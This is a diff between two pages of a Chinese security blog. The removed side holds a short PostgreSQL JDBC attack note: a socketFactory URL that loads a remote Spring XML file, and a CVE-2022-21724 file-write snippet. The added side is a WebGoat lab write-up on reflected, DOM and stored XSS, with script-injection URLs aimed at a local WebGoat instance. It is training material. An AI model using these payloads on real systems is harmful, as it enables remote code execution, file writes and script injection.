@@ -9,7 +9,7 @@
     
     <title>
         
-            postgreSQL |
+            WebGoat靶场-XSS |
         
         1diot9&#39;s Blog
     </title>
@@ -238,7 +238,7 @@
             <div class="post-content-bottom border-box">
                 
                     <div class="post-title">
-                        postgreSQL
+                        WebGoat靶场-XSS
                     </div>
                 
 
@@ -266,13 +266,13 @@
         
             <span class="meta-info-item post-create-date">
                 <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
-                <span class="datetime">2025-05-05 20:09:32</span>
+                <span class="datetime">2025-07-28 11:52:20</span>
             </span>
 
             
                 <span class="meta-info-item post-update-date">
                     <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                    <span class="datetime" data-updated="Mon May 05 2025 20:09:55 GMT+0800">2025-05-05 20:09:55</span>
+                    <span class="datetime" data-updated="Mon Jul 28 2025 11:53:18 GMT+0800">2025-07-28 11:53:18</span>
                 </span>
             
         
@@ -281,7 +281,7 @@
             <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
                 <ul class="post-category-ul">
                     
-                            <li class="category-item"><a href="/categories/Java%E5%AE%89%E5%85%A8/">Java安全</a></li>
+                            <li class="category-item"><a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li>
                         
                     
                 </ul>
@@ -295,6 +295,9 @@
                             <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a></li>
                         
                     
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li>
+                        
+                    
                 </ul>
             </span>
         
@@ -302,12 +305,12 @@
         
         
             <span class="meta-info-item post-wordcount">
-                <i class="icon fas fa-file-word"></i>&nbsp;<span>108 字</span>
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>502 字</span>
             </span>
         
         
             <span class="meta-info-item post-min2read">
-                <i class="icon fas fa-clock"></i>&nbsp;<span>1 分钟</span>
+                <i class="icon fas fa-clock"></i>&nbsp;<span>2 分钟</span>
             </span>
         
         
@@ -329,10 +332,31 @@
                     
 
                     
-                         <h1 id="构造方法调用"><a href="#构造方法调用" class="headerlink" title="构造方法调用"></a>构造方法调用</h1><p>DriverManager.getConnection(“jdbc:postgresql:&#x2F;&#x2F;node1&#x2F;test?socketFactory&#x3D;org.springframework.context.support.ClassPathXmlApplicationContext&amp;socketFactoryArg&#x3D;<a class="link"   target="_blank" rel="noopener" href="http://target/exp.xml" >http://target/exp.xml<i class="fas fa-external-link-alt"></i></a>“);</p>
-<h1 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cve202221724</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">loggerLevel</span> <span class="operator">=</span> <span class="string">&quot;debug&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">loggerFile</span> <span class="operator">=</span> <span class="string">&quot;test.txt&quot;</span>;</span><br><span class="line">        String shellContent=<span class="string">&quot;test&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jdbcUrl</span> <span class="operator">=</span> <span class="string">&quot;jdbc:postgresql://127.0.0.1:5432/test?loggerLevel=&quot;</span>+loggerLevel+<span class="string">&quot;&amp;loggerFile=&quot;</span>+loggerFile+ <span class="string">&quot;&amp;&quot;</span>+shellContent;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(jdbcUrl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>不过这样写保存的文件前后会有脏字符。</p>
+                         <h1 id="反射型-DOM"><a href="#反射型-DOM" class="headerlink" title="反射型&amp;DOM"></a>反射型&amp;DOM</h1><h2 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h2><p>没什么好说的，点一下按钮就行，只是让你初步认识一下控制台及script脚本的作用。</p>
+<h2 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h2><p>就最下面倒数第二个框可以注入，然后注入方式只有两种，alert和console.log，从源码可以看出来：</p>
+<p><img   src="https://cdn.nlark.com/yuque/0/2025/png/53465197/1753671769925-0ee0b157-357d-4c9a-bf55-984f5b474cb3.png"  alt="img"></p>
+<p>注入方法是写死的，必须满足题目设置。</p>
+<h2 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h2><p>这里考察DOM型XSS。</p>
+<p>首先看一下webgoat靶场中URL的特点</p>
+<p><a class="link"   target="_blank" rel="noopener" href="http://localhost:8085/WebGoat/start.mvc#lesson/CrossSiteScripting.lesson/9" >http://localhost:8085/WebGoat/start.mvc#lesson/CrossSiteScripting.lesson/9<i class="fas fa-external-link-alt"></i></a></p>
+<p>发现由#分割为两个部分。#后面的内容，是由前端处理的，也就是由script进行页面的切换。</p>
+<p>下面的内容涉及到js，我不太会，先贴别人的贴子了：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://drun1baby.top/2022/05/05/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-07-XSS/#2-XSS-PageLesson10-DOM-%E5%9E%8B-XSS-%E5%88%A9%E7%94%A8%E6%B5%8B%E8%AF%95%E7%9A%84%E4%BB%A3%E7%A0%81%E8%BF%9B%E8%A1%8C-XSS-%E6%94%BB%E5%87%BB" >https://drun1baby.top/2022/05/05/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-07-XSS/#2-XSS-PageLesson10-DOM-%E5%9E%8B-XSS-%E5%88%A9%E7%94%A8%E6%B5%8B%E8%AF%95%E7%9A%84%E4%BB%A3%E7%A0%81%E8%BF%9B%E8%A1%8C-XSS-%E6%94%BB%E5%87%BB<i class="fas fa-external-link-alt"></i></a></p>
+<p>简单来说就是找script文件中参数可控，且能触发xss的地方。</p>
+<p>最终结果是：start.mvc#test</p>
+<p>咱们可以通过这种路由去触发：<a class="link"   target="_blank" rel="noopener" href="http://localhost:8085/WebGoat/start.mvc#test/alert(1)%3C%2fscript%3E" >http://localhost:8085/WebGoat/start.mvc#test/%3Cscript%3Ealert%281%29%3C%2fscript%3E<i class="fas fa-external-link-alt"></i></a></p>
+<p>DOM型其实和反射型很像。</p>
+<p>两种的区别在于：</p>
+<ul>
+<li>DOM型是直接由前端处理注入的参数，整个过程不会向后端传递数据</li>
+<li>反射型是将数据传到后端过了一遍，再回显到前端页面实现注入的</li>
+</ul>
+<h2 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h2><p>用到上面那个#test，然后到f12 控制台检查。</p>
+<p><a class="link"   target="_blank" rel="noopener" href="http://localhost:8085/WebGoat/start.mvc#test/webgoat.customjs.phoneHome(123)%3C%2fscript%3E" >http://localhost:8085/WebGoat/start.mvc#test/%3Cscript%3Ewebgoat%2ecustomjs%2ephoneHome%28123%29%3C%2fscript%3E<i class="fas fa-external-link-alt"></i></a></p>
+<p><img   src="/WebGoat%E9%9D%B6%E5%9C%BA-XSS/image.png"  alt="img"></p>
+<h1 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h1><p>直接往评论区发，跟上面调用的script是一样的。只不过这里只要有用户浏览评论区就会触发。</p>
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这里显然只能学到最基础的，后面遇到具体漏洞的时候再补充吧</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a class="link"   target="_blank" rel="noopener" href="https://drun1baby.top/2022/05/05/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-07-XSS/" >https://drun1baby.top/2022/05/05/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-07-XSS/<i class="fas fa-external-link-alt"></i></a></p>
 
                     
                 </div>
@@ -343,11 +367,11 @@
     <div class="copyright-info-content border-box">
         <div class="copyright-info-top border-box">
             <div class="copyright-post-title border-box text-ellipsis">
-                postgreSQL
+                WebGoat靶场-XSS
             </div>
 
             <div class="copyright-post-link border-box text-ellipsis">
-                2025/05/05/postgreSQL/
+                2025/07/28/WebGoat靶场-XSS/
             </div>
         </div>
 
@@ -363,7 +387,7 @@
                 <div class="type">
                     发布于
                 </div>
-                <div class="content">2025-05-05 20:09</div>
+                <div class="content">2025-07-28 11:52</div>
             </div>
 
 
@@ -402,6 +426,10 @@
                                         <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a>
                                     </li>
                                 
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                                    </li>
+                                
                             </ul>
                         
                     </div>
@@ -415,31 +443,15 @@
                 
                     <div class="post-nav border-box">
                         
-                            <div class="prev-post">
-                                <a class="prev"
-                                   rel="prev"
-                                   href="/2025/05/05/h2sql/"
-                                   title="h2sql"
-                                >
-                                    <span class="left arrow-icon flex-center">
-                                        <i class="fas fa-chevron-left"></i>
-                                    </span>
-                                    <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">h2sql</span>
-                                        <span class="post-nav-item">上一篇</span>
-                                    </span>
-                                </a>
-                            </div>
-                        
                         
                             <div class="next-post">
                                 <a class="next"
                                    rel="next"
-                                   href="/2025/05/05/hsql/"
-                                   title="hsql"
+                                   href="/2025/07/28/WebGoat%E9%9D%B6%E5%9C%BA-SSRF/"
+                                   title="WebGoat靶场-SSRF&amp;反序列化"
                                 >
                                     <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">hsql</span>
+                                        <span class="post-nav-title-item text-ellipsis">WebGoat靶场-SSRF&amp;反序列化</span>
                                         <span class="post-nav-item">下一篇</span>
                                     </span>
                                     <span class="right arrow-icon flex-center">
@@ -467,7 +479,7 @@
             <div class="pc-post-toc right-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8"><span class="nav-number">1.</span> <span class="nav-text">构造方法调用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%99%E6%96%87%E4%BB%B6"><span class="nav-number">2.</span> <span class="nav-text">写文件</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8B-DOM"><span class="nav-number">1.</span> <span class="nav-text">反射型&amp;DOM</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E9%A2%98"><span class="nav-number">1.1.</span> <span class="nav-text">第一题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E9%A2%98"><span class="nav-number">1.2.</span> <span class="nav-text">第二题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E9%A2%98"><span class="nav-number">1.3.</span> <span class="nav-text">第三题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E9%A2%98"><span class="nav-number">1.4.</span> <span class="nav-text">第四题</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8B"><span class="nav-number">2.</span> <span class="nav-text">存储型</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">小结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">4.</span> <span class="nav-text">参考</span></a></li></ol>
     </div>
 </div>
 
@@ -657,7 +669,7 @@
             <div class="tablet-post-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8"><span class="nav-number">1.</span> <span class="nav-text">构造方法调用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%99%E6%96%87%E4%BB%B6"><span class="nav-number">2.</span> <span class="nav-text">写文件</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8B-DOM"><span class="nav-number">1.</span> <span class="nav-text">反射型&amp;DOM</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E9%A2%98"><span class="nav-number">1.1.</span> <span class="nav-text">第一题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E9%A2%98"><span class="nav-number">1.2.</span> <span class="nav-text">第二题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E9%A2%98"><span class="nav-number">1.3.</span> <span class="nav-text">第三题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E9%A2%98"><span class="nav-number">1.4.</span> <span class="nav-text">第四题</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8B"><span class="nav-number">2.</span> <span class="nav-text">存储型</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">小结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">4.</span> <span class="nav-text">参考</span></a></li></ol>
     </div>
 </div>
 
